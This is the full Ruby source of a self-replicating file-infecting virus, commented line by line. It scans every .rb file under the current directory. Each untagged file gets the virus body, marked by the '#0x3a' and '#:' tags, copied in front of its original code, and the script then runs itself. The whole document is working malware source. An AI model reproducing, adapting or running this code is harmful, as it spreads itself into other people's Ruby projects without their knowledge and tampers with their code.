#0x3a
#!/usr/bin/ruby
def infect_files
  count = 0     # This will halt content reading after the virus_bottom tag
  virus_top     = '#0x3a'       # Distinguishing tag telling us if the file is infected or not
  virus_bottom  = '#:'          # Tag at the bottom of the virus to as a marker of what code to infect other programs with
  files = Dir["./**/*.rb"]      # Grab all the ruby files in the directory of the infected file.

  files.each do |random_file|   # For each ruby file in the same directory as the infected file

    first_line = File.open(random_file, &:gets).strip # Grab the first line (to check the distinguishing tag at the top)

    if first_line != virus_top  # If the program is not infected
      File.rename(random_file, 'tmp.rb') # Rename the normal file to tmp.rb
      virus_file = File.open(__FILE__, "rb") # Open infecting file for reading
      virus_contents = '' # Storing virus data until virus_bottom is hit
      # This is necessary to prevent programs from writing their own content when embedding to other programs
      virus_file.each_line do |line| # for every line in the infected file
        virus_contents += line  # Add each line to our virus content
        if line =~ /#{virus_bottom}/
          count += 1
          if count == 2 then break end # Until we hit the virus_bottom tag
        end
      end
      File.open(random_file, 'w') {|f| f.write(virus_contents) } # Write virus content to the old file's name
      good_file = File.open('tmp.rb', 'rb') # Open the tmp.rb file (contains good code) for reading
      good_contents = good_file.read # Grab the contents of the good file
      File.open(random_file, 'a') {|f| f.write(good_contents)} # Append the good content to the random file
      File.delete('tmp.rb') # Delete the temporary file
    end
  end
end

infect_files # Run the virus
